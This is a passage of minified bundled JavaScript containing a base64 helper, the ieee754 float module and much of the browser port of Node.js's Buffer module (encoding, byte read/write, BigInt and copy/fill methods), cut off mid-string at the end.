t(c(f,w,m)),S=0,T=m>0?w-4:w,k;for(k=0;k<T;k+=4)p=e[f.charCodeAt(k)]<<18|e[f.charCodeAt(k+1)]<<12|e[f.charCodeAt(k+2)]<<6|e[f.charCodeAt(k+3)],x[S++]=p>>16&255,x[S++]=p>>8&255,x[S++]=p&255;return m===2&&(p=e[f.charCodeAt(k)]<<2|e[f.charCodeAt(k+1)]>>4,x[S++]=p&255),m===1&&(p=e[f.charCodeAt(k)]<<10|e[f.charCodeAt(k+1)]<<4|e[f.charCodeAt(k+2)]>>2,x[S++]=p>>8&255,x[S++]=p&255),x}function u(f){return r[f>>18&63]+r[f>>12&63]+r[f>>6&63]+r[f&63]}function d(f,p,g){for(var w,m=[],x=p;x<g;x+=3)w=(f[x]<<16&16711680)+(f[x+1]<<8&65280)+(f[x+2]&255),m.push(u(w));return m.join("")}function h(f){for(var p,g=f.length,w=g%3,m=[],x=16383,S=0,T=g-w;S<T;S+=x)m.push(d(f,S,S+x>T?T:S+x));return w===1?(p=f[g-1],m.push(r[p>>2]+r[p<<4&63]+"==")):w===2&&(p=(f[g-2]<<8)+f[g-1],m.push(r[p>>10]+r[p>>4&63]+r[p<<2&63]+"=")),m.join("")}return db}var j6={};/*! ieee754. BSD-3-Clause License. Feross Aboukhadijeh <https://feross.org/opensource> */var wL;function k1e(){return wL||(wL=1,j6.read=function(r,e,t,i,n){var s,o,a=n*8-i-1,c=(1<<a)-1,l=c>>1,u=-7,d=t?n-1:0,h=t?-1:1,f=r[e+d];for(d+=h,s=f&(1<<-u)-1,f>>=-u,u+=a;u>0;s=s*256+r[e+d],d+=h,u-=8);for(o=s&(1<<-u)-1,s>>=-u,u+=i;u>0;o=o*256+r[e+d],d+=h,u-=8);if(s===0)s=1-l;else{if(s===c)return o?NaN:(f?-1:1)*(1/0);o=o+Math.pow(2,i),s=s-l}return(f?-1:1)*o*Math.pow(2,s-i)},j6.write=function(r,e,t,i,n,s){var o,a,c,l=s*8-n-1,u=(1<<l)-1,d=u>>1,h=n===23?Math.pow(2,-24)-Math.pow(2,-77):0,f=i?0:s-1,p=i?1:-1,g=e<0||e===0&&1/e<0?1:0;for(e=Math.abs(e),isNaN(e)||e===1/0?(a=isNaN(e)?1:0,o=u):(o=Math.floor(Math.log(e)/Math.LN2),e*(c=Math.pow(2,-o))<1&&(o--,c*=2),o+d>=1?e+=h/c:e+=h*Math.pow(2,1-d),e*c>=2&&(o++,c/=2),o+d>=u?(a=0,o=u):o+d>=1?(a=(e*c-1)*Math.pow(2,n),o=o+d):(a=e*Math.pow(2,d-1)*Math.pow(2,n),o=0));n>=8;r[t+f]=a&255,f+=p,a/=256,n-=8);for(o=o<<n|a,l+=n;l>0;r[t+f]=o&255,f+=p,o/=256,l-=8);r[t+f-p]|=g*128}),j6}/*!
 * The buffer module from node.js, for the browser.
 *
 * @author   Feross Aboukhadijeh <https://feross.org>
 * @license  MIT
 */var bL;function N1e(){return bL||(bL=1,function(r){const e=T1e(),t=k1e(),i=typeof Symbol=="function"&&typeof Symbol.for=="function"?Symbol.for("nodejs.util.inspect.custom"):null;r.Buffer=a,r.SlowBuffer=x,r.INSPECT_MAX_BYTES=50;const n=2147483647;r.kMaxLength=n,a.TYPED_ARRAY_SUPPORT=s(),!a.TYPED_ARRAY_SUPPORT&&typeof console<"u"&&typeof console.error=="function"&&console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support.");function s(){try{const Q=new Uint8Array(1),z={foo:function(){return 42}};return Object.setPrototypeOf(z,Uint8Array.prototype),Object.setPrototypeOf(Q,z),Q.foo()===42}catch{return!1}}Object.defineProperty(a.prototype,"parent",{enumerable:!0,get:function(){if(a.isBuffer(this))return this.buffer}}),Object.defineProperty(a.prototype,"offset",{enumerable:!0,get:function(){if(a.isBuffer(this))return this.byteOffset}});function o(Q){if(Q>n)throw new RangeError('The value "'+Q+'" is invalid for option "size"');const z=new Uint8Array(Q);return Object.setPrototypeOf(z,a.prototype),z}function a(Q,z,H){if(typeof Q=="number"){if(typeof z=="string")throw new TypeError('The "string" argument must be of type string. Received type number');return d(Q)}return c(Q,z,H)}a.poolSize=8192;function c(Q,z,H){if(typeof Q=="string")return h(Q,z);if(ArrayBuffer.isView(Q))return p(Q);if(Q==null)throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof Q);if(it(Q,ArrayBuffer)||Q&&it(Q.buffer,ArrayBuffer)||typeof SharedArrayBuffer<"u"&&(it(Q,SharedArrayBuffer)||Q&&it(Q.buffer,SharedArrayBuffer)))return g(Q,z,H);if(typeof Q=="number")throw new TypeError('The "value" argument must not be of type number. Received type number');const ie=Q.valueOf&&Q.valueOf();if(ie!=null&&ie!==Q)return a.from(ie,z,H);const pe=w(Q);if(pe)return pe;if(typeof Symbol<"u"&&Symbol.toPrimitive!=null&&typeof Q[Symbol.toPrimitive]=="function")return a.from(Q[Symbol.toPrimitive]("string"),z,H);throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof Q)}a.from=function(Q,z,H){return c(Q,z,H)},Object.setPrototypeOf(a.prototype,Uint8Array.prototype),Object.setPrototypeOf(a,Uint8Array);function l(Q){if(typeof Q!="number")throw new TypeError('"size" argument must be of type number');if(Q<0)throw new RangeError('The value "'+Q+'" is invalid for option "size"')}function u(Q,z,H){return l(Q),Q<=0?o(Q):z!==void 0?typeof H=="string"?o(Q).fill(z,H):o(Q).fill(z):o(Q)}a.alloc=function(Q,z,H){return u(Q,z,H)};function d(Q){return l(Q),o(Q<0?0:m(Q)|0)}a.allocUnsafe=function(Q){return d(Q)},a.allocUnsafeSlow=function(Q){return d(Q)};function h(Q,z){if((typeof z!="string"||z==="")&&(z="utf8"),!a.isEncoding(z))throw new TypeError("Unknown encoding: "+z);const H=S(Q,z)|0;let ie=o(H);const pe=ie.write(Q,z);return pe!==H&&(ie=ie.slice(0,pe)),ie}function f(Q){const z=Q.length<0?0:m(Q.length)|0,H=o(z);for(let ie=0;ie<z;ie+=1)H[ie]=Q[ie]&255;return H}function p(Q){if(it(Q,Uint8Array)){const z=new Uint8Array(Q);return g(z.buffer,z.byteOffset,z.byteLength)}return f(Q)}function g(Q,z,H){if(z<0||Q.byteLength<z)throw new RangeError('"offset" is outside of buffer bounds');if(Q.byteLength<z+(H||0))throw new RangeError('"length" is outside of buffer bounds');let ie;return z===void 0&&H===void 0?ie=new Uint8Array(Q):H===void 0?ie=new Uint8Array(Q,z):ie=new Uint8Array(Q,z,H),Object.setPrototypeOf(ie,a.prototype),ie}function w(Q){if(a.isBuffer(Q)){const z=m(Q.length)|0,H=o(z);return H.length===0||Q.copy(H,0,0,z),H}if(Q.length!==void 0)return typeof Q.length!="number"||nt(Q.length)?o(0):f(Q);if(Q.type==="Buffer"&&Array.isArray(Q.data))return f(Q.data)}function m(Q){if(Q>=n)throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x"+n.toString(16)+" bytes");return Q|0}function x(Q){return+Q!=Q&&(Q=0),a.alloc(+Q)}a.isBuffer=function(z){return z!=null&&z._isBuffer===!0&&z!==a.prototype},a.compare=function(z,H){if(it(z,Uint8Array)&&(z=a.from(z,z.offset,z.byteLength)),it(H,Uint8Array)&&(H=a.from(H,H.offset,H.byteLength)),!a.isBuffer(z)||!a.isBuffer(H))throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');if(z===H)return 0;let ie=z.length,pe=H.length;for(let we=0,_e=Math.min(ie,pe);we<_e;++we)if(z[we]!==H[we]){ie=z[we],pe=H[we];break}return ie<pe?-1:pe<ie?1:0},a.isEncoding=function(z){switch(String(z).toLowerCase()){case"hex":case"utf8":case"utf-8":case"ascii":case"latin1":case"binary":case"base64":case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return!0;default:return!1}},a.concat=function(z,H){if(!Array.isArray(z))throw new TypeError('"list" argument must be an Array of Buffers');if(z.length===0)return a.alloc(0);let ie;if(H===void 0)for(H=0,ie=0;ie<z.length;++ie)H+=z[ie].length;const pe=a.allocUnsafe(H);let we=0;for(ie=0;ie<z.length;++ie){let _e=z[ie];if(it(_e,Uint8Array))we+_e.length>pe.length?(a.isBuffer(_e)||(_e=a.from(_e)),_e.copy(pe,we)):Uint8Array.prototype.set.call(pe,_e,we);else if(a.isBuffer(_e))_e.copy(pe,we);else throw new TypeError('"list" argument must be an Array of Buffers');we+=_e.length}return pe};function S(Q,z){if(a.isBuffer(Q))return Q.length;if(ArrayBuffer.isView(Q)||it(Q,ArrayBuffer))return Q.byteLength;if(typeof Q!="string")throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type '+typeof Q);const H=Q.length,ie=arguments.length>2&&arguments[2]===!0;if(!ie&&H===0)return 0;let pe=!1;for(;;)switch(z){case"ascii":case"latin1":case"binary":return H;case"utf8":case"utf-8":return Re(Q).length;case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return H*2;case"hex":return H>>>1;case"base64":return De(Q).length;default:if(pe)return ie?-1:Re(Q).length;z=(""+z).toLowerCase(),pe=!0}}a.byteLength=S;function T(Q,z,H){let ie=!1;if((z===void 0||z<0)&&(z=0),z>this.length||((H===void 0||H>this.length)&&(H=this.length),H<=0)||(H>>>=0,z>>>=0,H<=z))return"";for(Q||(Q="utf8");;)switch(Q){case"hex":return R(this,z,H);case"utf8":case"utf-8":return b(this,z,H);case"ascii":return O(this,z,H);case"latin1":case"binary":return D(this,z,H);case"base64":return A(this,z,H);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return P(this,z,H);default:if(ie)throw new TypeError("Unknown encoding: "+Q);Q=(Q+"").toLowerCase(),ie=!0}}a.prototype._isBuffer=!0;function k(Q,z,H){const ie=Q[z];Q[z]=Q[H],Q[H]=ie}a.prototype.swap16=function(){const z=this.length;if(z%2!==0)throw new RangeError("Buffer size must be a multiple of 16-bits");for(let H=0;H<z;H+=2)k(this,H,H+1);return this},a.prototype.swap32=function(){const z=this.length;if(z%4!==0)throw new RangeError("Buffer size must be a multiple of 32-bits");for(let H=0;H<z;H+=4)k(this,H,H+3),k(this,H+1,H+2);return this},a.prototype.swap64=function(){const z=this.length;if(z%8!==0)throw new RangeError("Buffer size must be a multiple of 64-bits");for(let H=0;H<z;H+=8)k(this,H,H+7),k(this,H+1,H+6),k(this,H+2,H+5),k(this,H+3,H+4);return this},a.prototype.toString=function(){const z=this.length;return z===0?"":arguments.length===0?b(this,0,z):T.apply(this,arguments)},a.prototype.toLocaleString=a.prototype.toString,a.prototype.equals=function(z){if(!a.isBuffer(z))throw new TypeError("Argument must be a Buffer");return this===z?!0:a.compare(this,z)===0},a.prototype.inspect=function(){let z="";const H=r.INSPECT_MAX_BYTES;return z=this.toString("hex",0,H).replace(/(.{2})/g,"$1 ").trim(),this.length>H&&(z+=" ... "),"<Buffer "+z+">"},i&&(a.prototype[i]=a.prototype.inspect),a.prototype.compare=function(z,H,ie,pe,we){if(it(z,Uint8Array)&&(z=a.from(z,z.offset,z.byteLength)),!a.isBuffer(z))throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type '+typeof z);if(H===void 0&&(H=0),ie===void 0&&(ie=z?z.length:0),pe===void 0&&(pe=0),we===void 0&&(we=this.length),H<0||ie>z.length||pe<0||we>this.length)throw new RangeError("out of range index");if(pe>=we&&H>=ie)return 0;if(pe>=we)return-1;if(H>=ie)return 1;if(H>>>=0,ie>>>=0,pe>>>=0,we>>>=0,this===z)return 0;let _e=we-pe,et=ie-H;const yt=Math.min(_e,et),Ye=this.slice(pe,we),$t=z.slice(H,ie);for(let xt=0;xt<yt;++xt)if(Ye[xt]!==$t[xt]){_e=Ye[xt],et=$t[xt];break}return _e<et?-1:et<_e?1:0};function I(Q,z,H,ie,pe){if(Q.length===0)return-1;if(typeof H=="string"?(ie=H,H=0):H>2147483647?H=2147483647:H<-2147483648&&(H=-2147483648),H=+H,nt(H)&&(H=pe?0:Q.length-1),H<0&&(H=Q.length+H),H>=Q.length){if(pe)return-1;H=Q.length-1}else if(H<0)if(pe)H=0;else return-1;if(typeof z=="string"&&(z=a.from(z,ie)),a.isBuffer(z))return z.length===0?-1:E(Q,z,H,ie,pe);if(typeof z=="number")return z=z&255,typeof Uint8Array.prototype.indexOf=="function"?pe?Uint8Array.prototype.indexOf.call(Q,z,H):Uint8Array.prototype.lastIndexOf.call(Q,z,H):E(Q,[z],H,ie,pe);throw new TypeError("val must be string, number or Buffer")}function E(Q,z,H,ie,pe){let we=1,_e=Q.length,et=z.length;if(ie!==void 0&&(ie=String(ie).toLowerCase(),ie==="ucs2"||ie==="ucs-2"||ie==="utf16le"||ie==="utf-16le")){if(Q.length<2||z.length<2)return-1;we=2,_e/=2,et/=2,H/=2}function yt($t,xt){return we===1?$t[xt]:$t.readUInt16BE(xt*we)}let Ye;if(pe){let $t=-1;for(Ye=H;Ye<_e;Ye++)if(yt(Q,Ye)===yt(z,$t===-1?0:Ye-$t)){if($t===-1&&($t=Ye),Ye-$t+1===et)return $t*we}else $t!==-1&&(Ye-=Ye-$t),$t=-1}else for(H+et>_e&&(H=_e-et),Ye=H;Ye>=0;Ye--){let $t=!0;for(let xt=0;xt<et;xt++)if(yt(Q,Ye+xt)!==yt(z,xt)){$t=!1;break}if($t)return Ye}return-1}a.prototype.includes=function(z,H,ie){return this.indexOf(z,H,ie)!==-1},a.prototype.indexOf=function(z,H,ie){return I(this,z,H,ie,!0)},a.prototype.lastIndexOf=function(z,H,ie){return I(this,z,H,ie,!1)};function C(Q,z,H,ie){H=Number(H)||0;const pe=Q.length-H;ie?(ie=Number(ie),ie>pe&&(ie=pe)):ie=pe;const we=z.length;ie>we/2&&(ie=we/2);let _e;for(_e=0;_e<ie;++_e){const et=parseInt(z.substr(_e*2,2),16);if(nt(et))return _e;Q[H+_e]=et}return _e}function N(Q,z,H,ie){return Le(Re(z,Q.length-H),Q,H,ie)}function L(Q,z,H,ie){return Le($e(z),Q,H,ie)}function $(Q,z,H,ie){return Le(De(z),Q,H,ie)}function y(Q,z,H,ie){return Le(Ae(z,Q.length-H),Q,H,ie)}a.prototype.write=function(z,H,ie,pe){if(H===void 0)pe="utf8",ie=this.length,H=0;else if(ie===void 0&&typeof H=="string")pe=H,ie=this.length,H=0;else if(isFinite(H))H=H>>>0,isFinite(ie)?(ie=ie>>>0,pe===void 0&&(pe="utf8")):(pe=ie,ie=void 0);else throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");const we=this.length-H;if((ie===void 0||ie>we)&&(ie=we),z.length>0&&(ie<0||H<0)||H>this.length)throw new RangeError("Attempt to write outside buffer bounds");pe||(pe="utf8");let _e=!1;for(;;)switch(pe){case"hex":return C(this,z,H,ie);case"utf8":case"utf-8":return N(this,z,H,ie);case"ascii":case"latin1":case"binary":return L(this,z,H,ie);case"base64":return $(this,z,H,ie);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return y(this,z,H,ie);default:if(_e)throw new TypeError("Unknown encoding: "+pe);pe=(""+pe).toLowerCase(),_e=!0}},a.prototype.toJSON=function(){return{type:"Buffer",data:Array.prototype.slice.call(this._arr||this,0)}};function A(Q,z,H){return z===0&&H===Q.length?e.fromByteArray(Q):e.fromByteArray(Q.slice(z,H))}function b(Q,z,H){H=Math.min(Q.length,H);const ie=[];let pe=z;for(;pe<H;){const we=Q[pe];let _e=null,et=we>239?4:we>223?3:we>191?2:1;if(pe+et<=H){let yt,Ye,$t,xt;switch(et){case 1:we<128&&(_e=we);break;case 2:yt=Q[pe+1],(yt&192)===128&&(xt=(we&31)<<6|yt&63,xt>127&&(_e=xt));break;case 3:yt=Q[pe+1],Ye=Q[pe+2],(yt&192)===128&&(Ye&192)===128&&(xt=(we&15)<<12|(yt&63)<<6|Ye&63,xt>2047&&(xt<55296||xt>57343)&&(_e=xt));break;case 4:yt=Q[pe+1],Ye=Q[pe+2],$t=Q[pe+3],(yt&192)===128&&(Ye&192)===128&&($t&192)===128&&(xt=(we&15)<<18|(yt&63)<<12|(Ye&63)<<6|$t&63,xt>65535&&xt<1114112&&(_e=xt))}}_e===null?(_e=65533,et=1):_e>65535&&(_e-=65536,ie.push(_e>>>10&1023|55296),_e=56320|_e&1023),ie.push(_e),pe+=et}return _(ie)}const v=4096;function _(Q){const z=Q.length;if(z<=v)return String.fromCharCode.apply(String,Q);let H="",ie=0;for(;ie<z;)H+=String.fromCharCode.apply(String,Q.slice(ie,ie+=v));return H}function O(Q,z,H){let ie="";H=Math.min(Q.length,H);for(let pe=z;pe<H;++pe)ie+=String.fromCharCode(Q[pe]&127);return ie}function D(Q,z,H){let ie="";H=Math.min(Q.length,H);for(let pe=z;pe<H;++pe)ie+=String.fromCharCode(Q[pe]);return ie}function R(Q,z,H){const ie=Q.length;(!z||z<0)&&(z=0),(!H||H<0||H>ie)&&(H=ie);let pe="";for(let we=z;we<H;++we)pe+=ct[Q[we]];return pe}function P(Q,z,H){const ie=Q.slice(z,H);let pe="";for(let we=0;we<ie.length-1;we+=2)pe+=String.fromCharCode(ie[we]+ie[we+1]*256);return pe}a.prototype.slice=function(z,H){const ie=this.length;z=~~z,H=H===void 0?ie:~~H,z<0?(z+=ie,z<0&&(z=0)):z>ie&&(z=ie),H<0?(H+=ie,H<0&&(H=0)):H>ie&&(H=ie),H<z&&(H=z);const pe=this.subarray(z,H);return Object.setPrototypeOf(pe,a.prototype),pe};function B(Q,z,H){if(Q%1!==0||Q<0)throw new RangeError("offset is not uint");if(Q+z>H)throw new RangeError("Trying to access beyond buffer length")}a.prototype.readUintLE=a.prototype.readUIntLE=function(z,H,ie){z=z>>>0,H=H>>>0,ie||B(z,H,this.length);let pe=this[z],we=1,_e=0;for(;++_e<H&&(we*=256);)pe+=this[z+_e]*we;return pe},a.prototype.readUintBE=a.prototype.readUIntBE=function(z,H,ie){z=z>>>0,H=H>>>0,ie||B(z,H,this.length);let pe=this[z+--H],we=1;for(;H>0&&(we*=256);)pe+=this[z+--H]*we;return pe},a.prototype.readUint8=a.prototype.readUInt8=function(z,H){return z=z>>>0,H||B(z,1,this.length),this[z]},a.prototype.readUint16LE=a.prototype.readUInt16LE=function(z,H){return z=z>>>0,H||B(z,2,this.length),this[z]|this[z+1]<<8},a.prototype.readUint16BE=a.prototype.readUInt16BE=function(z,H){return z=z>>>0,H||B(z,2,this.length),this[z]<<8|this[z+1]},a.prototype.readUint32LE=a.prototype.readUInt32LE=function(z,H){return z=z>>>0,H||B(z,4,this.length),(this[z]|this[z+1]<<8|this[z+2]<<16)+this[z+3]*16777216},a.prototype.readUint32BE=a.prototype.readUInt32BE=function(z,H){return z=z>>>0,H||B(z,4,this.length),this[z]*16777216+(this[z+1]<<16|this[z+2]<<8|this[z+3])},a.prototype.readBigUInt64LE=St(function(z){z=z>>>0,Y(z,"offset");const H=this[z],ie=this[z+7];(H===void 0||ie===void 0)&&se(z,this.length-8);const pe=H+this[++z]*2**8+this[++z]*2**16+this[++z]*2**24,we=this[++z]+this[++z]*2**8+this[++z]*2**16+ie*2**24;return BigInt(pe)+(BigInt(we)<<BigInt(32))}),a.prototype.readBigUInt64BE=St(function(z){z=z>>>0,Y(z,"offset");const H=this[z],ie=this[z+7];(H===void 0||ie===void 0)&&se(z,this.length-8);const pe=H*2**24+this[++z]*2**16+this[++z]*2**8+this[++z],we=this[++z]*2**24+this[++z]*2**16+this[++z]*2**8+ie;return(BigInt(pe)<<BigInt(32))+BigInt(we)}),a.prototype.readIntLE=function(z,H,ie){z=z>>>0,H=H>>>0,ie||B(z,H,this.length);let pe=this[z],we=1,_e=0;for(;++_e<H&&(we*=256);)pe+=this[z+_e]*we;return we*=128,pe>=we&&(pe-=Math.pow(2,8*H)),pe},a.prototype.readIntBE=function(z,H,ie){z=z>>>0,H=H>>>0,ie||B(z,H,this.length);let pe=H,we=1,_e=this[z+--pe];for(;pe>0&&(we*=256);)_e+=this[z+--pe]*we;return we*=128,_e>=we&&(_e-=Math.pow(2,8*H)),_e},a.prototype.readInt8=function(z,H){return z=z>>>0,H||B(z,1,this.length),this[z]&128?(255-this[z]+1)*-1:this[z]},a.prototype.readInt16LE=function(z,H){z=z>>>0,H||B(z,2,this.length);const ie=this[z]|this[z+1]<<8;return ie&32768?ie|4294901760:ie},a.prototype.readInt16BE=function(z,H){z=z>>>0,H||B(z,2,this.length);const ie=this[z+1]|this[z]<<8;return ie&32768?ie|4294901760:ie},a.prototype.readInt32LE=function(z,H){return z=z>>>0,H||B(z,4,this.length),this[z]|this[z+1]<<8|this[z+2]<<16|this[z+3]<<24},a.prototype.readInt32BE=function(z,H){return z=z>>>0,H||B(z,4,this.length),this[z]<<24|this[z+1]<<16|this[z+2]<<8|this[z+3]},a.prototype.readBigInt64LE=St(function(z){z=z>>>0,Y(z,"offset");const H=this[z],ie=this[z+7];(H===void 0||ie===void 0)&&se(z,this.length-8);const pe=this[z+4]+this[z+5]*2**8+this[z+6]*2**16+(ie<<24);return(BigInt(pe)<<BigInt(32))+BigInt(H+this[++z]*2**8+this[++z]*2**16+this[++z]*2**24)}),a.prototype.readBigInt64BE=St(function(z){z=z>>>0,Y(z,"offset");const H=this[z],ie=this[z+7];(H===void 0||ie===void 0)&&se(z,this.length-8);const pe=(H<<24)+this[++z]*2**16+this[++z]*2**8+this[++z];return(BigInt(pe)<<BigInt(32))+BigInt(this[++z]*2**24+this[++z]*2**16+this[++z]*2**8+ie)}),a.prototype.readFloatLE=function(z,H){return z=z>>>0,H||B(z,4,this.length),t.read(this,z,!0,23,4)},a.prototype.readFloatBE=function(z,H){return z=z>>>0,H||B(z,4,this.length),t.read(this,z,!1,23,4)},a.prototype.readDoubleLE=function(z,H){return z=z>>>0,H||B(z,8,this.length),t.read(this,z,!0,52,8)},a.prototype.readDoubleBE=function(z,H){return z=z>>>0,H||B(z,8,this.length),t.read(this,z,!1,52,8)};function M(Q,z,H,ie,pe,we){if(!a.isBuffer(Q))throw new TypeError('"buffer" argument must be a Buffer instance');if(z>pe||z<we)throw new RangeError('"value" argument is out of bounds');if(H+ie>Q.length)throw new RangeError("Index out of range")}a.prototype.writeUintLE=a.prototype.writeUIntLE=function(z,H,ie,pe){if(z=+z,H=H>>>0,ie=ie>>>0,!pe){const et=Math.pow(2,8*ie)-1;M(this,z,H,ie,et,0)}let we=1,_e=0;for(this[H]=z&255;++_e<ie&&(we*=256);)this[H+_e]=z/we&255;return H+ie},a.prototype.writeUintBE=a.prototype.writeUIntBE=function(z,H,ie,pe){if(z=+z,H=H>>>0,ie=ie>>>0,!pe){const et=Math.pow(2,8*ie)-1;M(this,z,H,ie,et,0)}let we=ie-1,_e=1;for(this[H+we]=z&255;--we>=0&&(_e*=256);)this[H+we]=z/_e&255;return H+ie},a.prototype.writeUint8=a.prototype.writeUInt8=function(z,H,ie){return z=+z,H=H>>>0,ie||M(this,z,H,1,255,0),this[H]=z&255,H+1},a.prototype.writeUint16LE=a.prototype.writeUInt16LE=function(z,H,ie){return z=+z,H=H>>>0,ie||M(this,z,H,2,65535,0),this[H]=z&255,this[H+1]=z>>>8,H+2},a.prototype.writeUint16BE=a.prototype.writeUInt16BE=function(z,H,ie){return z=+z,H=H>>>0,ie||M(this,z,H,2,65535,0),this[H]=z>>>8,this[H+1]=z&255,H+2},a.prototype.writeUint32LE=a.prototype.writeUInt32LE=function(z,H,ie){return z=+z,H=H>>>0,ie||M(this,z,H,4,4294967295,0),this[H+3]=z>>>24,this[H+2]=z>>>16,this[H+1]=z>>>8,this[H]=z&255,H+4},a.prototype.writeUint32BE=a.prototype.writeUInt32BE=function(z,H,ie){return z=+z,H=H>>>0,ie||M(this,z,H,4,4294967295,0),this[H]=z>>>24,this[H+1]=z>>>16,this[H+2]=z>>>8,this[H+3]=z&255,H+4};function W(Q,z,H,ie,pe){j(z,ie,pe,Q,H,7);let we=Number(z&BigInt(4294967295));Q[H++]=we,we=we>>8,Q[H++]=we,we=we>>8,Q[H++]=we,we=we>>8,Q[H++]=we;let _e=Number(z>>BigInt(32)&BigInt(4294967295));return Q[H++]=_e,_e=_e>>8,Q[H++]=_e,_e=_e>>8,Q[H++]=_e,_e=_e>>8,Q[H++]=_e,H}function K(Q,z,H,ie,pe){j(z,ie,pe,Q,H,7);let we=Number(z&BigInt(4294967295));Q[H+7]=we,we=we>>8,Q[H+6]=we,we=we>>8,Q[H+5]=we,we=we>>8,Q[H+4]=we;let _e=Number(z>>BigInt(32)&BigInt(4294967295));return Q[H+3]=_e,_e=_e>>8,Q[H+2]=_e,_e=_e>>8,Q[H+1]=_e,_e=_e>>8,Q[H]=_e,H+8}a.prototype.writeBigUInt64LE=St(function(z,H=0){return W(this,z,H,BigInt(0),BigInt("0xffffffffffffffff"))}),a.prototype.writeBigUInt64BE=St(function(z,H=0){return K(this,z,H,BigInt(0),BigInt("0xffffffffffffffff"))}),a.prototype.writeIntLE=function(z,H,ie,pe){if(z=+z,H=H>>>0,!pe){const yt=Math.pow(2,8*ie-1);M(this,z,H,ie,yt-1,-yt)}let we=0,_e=1,et=0;for(this[H]=z&255;++we<ie&&(_e*=256);)z<0&&et===0&&this[H+we-1]!==0&&(et=1),this[H+we]=(z/_e>>0)-et&255;return H+ie},a.prototype.writeIntBE=function(z,H,ie,pe){if(z=+z,H=H>>>0,!pe){const yt=Math.pow(2,8*ie-1);M(this,z,H,ie,yt-1,-yt)}let we=ie-1,_e=1,et=0;for(this[H+we]=z&255;--we>=0&&(_e*=256);)z<0&&et===0&&this[H+we+1]!==0&&(et=1),this[H+we]=(z/_e>>0)-et&255;return H+ie},a.prototype.writeInt8=function(z,H,ie){return z=+z,H=H>>>0,ie||M(this,z,H,1,127,-128),z<0&&(z=255+z+1),this[H]=z&255,H+1},a.prototype.writeInt16LE=function(z,H,ie){return z=+z,H=H>>>0,ie||M(this,z,H,2,32767,-32768),this[H]=z&255,this[H+1]=z>>>8,H+2},a.prototype.writeInt16BE=function(z,H,ie){return z=+z,H=H>>>0,ie||M(this,z,H,2,32767,-32768),this[H]=z>>>8,this[H+1]=z&255,H+2},a.prototype.writeInt32LE=function(z,H,ie){return z=+z,H=H>>>0,ie||M(this,z,H,4,2147483647,-2147483648),this[H]=z&255,this[H+1]=z>>>8,this[H+2]=z>>>16,this[H+3]=z>>>24,H+4},a.prototype.writeInt32BE=function(z,H,ie){return z=+z,H=H>>>0,ie||M(this,z,H,4,2147483647,-2147483648),z<0&&(z=4294967295+z+1),this[H]=z>>>24,this[H+1]=z>>>16,this[H+2]=z>>>8,this[H+3]=z&255,H+4},a.prototype.writeBigInt64LE=St(function(z,H=0){return W(this,z,H,-BigInt("0x8000000000000000"),BigInt("0x7fffffffffffffff"))}),a.prototype.writeBigInt64BE=St(function(z,H=0){return K(this,z,H,-BigInt("0x8000000000000000"),BigInt("0x7fffffffffffffff"))});function q(Q,z,H,ie,pe,we){if(H+ie>Q.length)throw new RangeError("Index out of range");if(H<0)throw new RangeError("Index out of range")}function J(Q,z,H,ie,pe){return z=+z,H=H>>>0,pe||q(Q,z,H,4),t.write(Q,z,H,ie,23,4),H+4}a.prototype.writeFloatLE=function(z,H,ie){return J(this,z,H,!0,ie)},a.prototype.writeFloatBE=function(z,H,ie){return J(this,z,H,!1,ie)};function le(Q,z,H,ie,pe){return z=+z,H=H>>>0,pe||q(Q,z,H,8),t.write(Q,z,H,ie,52,8),H+8}a.prototype.writeDoubleLE=function(z,H,ie){return le(this,z,H,!0,ie)},a.prototype.writeDoubleBE=function(z,H,ie){return le(this,z,H,!1,ie)},a.prototype.copy=function(z,H,ie,pe){if(!a.isBuffer(z))throw new TypeError("argument should be a Buffer");if(ie||(ie=0),!pe&&pe!==0&&(pe=this.length),H>=z.length&&(H=z.length),H||(H=0),pe>0&&pe<ie&&(pe=ie),pe===ie||z.length===0||this.length===0)return 0;if(H<0)throw new RangeError("targetStart out of bounds");if(ie<0||ie>=this.length)throw new RangeError("Index out of range");if(pe<0)throw new RangeError("sourceEnd out of bounds");pe>this.length&&(pe=this.length),z.length-H<pe-ie&&(pe=z.length-H+ie);const we=pe-ie;return this===z&&typeof Uint8Array.prototype.copyWithin=="function"?this.copyWithin(H,ie,pe):Uint8Array.prototype.set.call(z,this.subarray(ie,pe),H),we},a.prototype.fill=function(z,H,ie,pe){if(typeof z=="string"){if(typeof H=="string"?(pe=H,H=0,ie=this.length):typeof ie=="string"&&(pe=ie,ie=this.length),pe!==void 0&&typeof pe!="string")throw new TypeError("encoding must be a string");if(typeof pe=="string"&&!a.isEncoding(pe))throw new TypeError("Unknown encoding: "+pe);if(z.length===1){const _e=z.charCodeAt(0);(pe==="utf8"&&_e<128||pe==="latin1")&&(z=_e)}}else typeof z=="number"?z=z&255:typeof z=="boolean"&&(z=Number(z));if(H<0||this.length<H||this.length<ie)throw new RangeError("Out of range index");if(ie<=H)return this;H=H>>>0,ie=ie===void 0?this.length:ie>>>0,z||(z=0);let we;if(typeof z=="number")for(we=H;we<ie;++we)this[we]=z;else{const _e=a.isBuffer(z)?z:a.from(z,pe),et=_e.length;if(et===0)throw new TypeError('The value "'+z+'" is invalid for argument "value"');for(we=0;we<ie-H;++we)this[we+H]=_e[we%et]}return this};const ae={};function U(Q,z,H){ae[Q]=class extends H{constructor(){super(),Object.defineProperty(this,"message",{value:z.apply(this,arguments),writable:!0,configurable:!0}),this.name=`${this.name} [${Q}]`,this.stack,delete this.name}get code(){return Q}set code(pe){Object.defineProperty(this,"code",{configurable:!0,enumerable:!0,value:pe,writable:!0})}toString(){return`${this.name} [${Q}]: ${this.message}`}}}U("ERR_BUFFER_OUT_OF_BOUNDS",function(Q){return Q?`${Q} is outside of buffer bounds`:"Attempt to 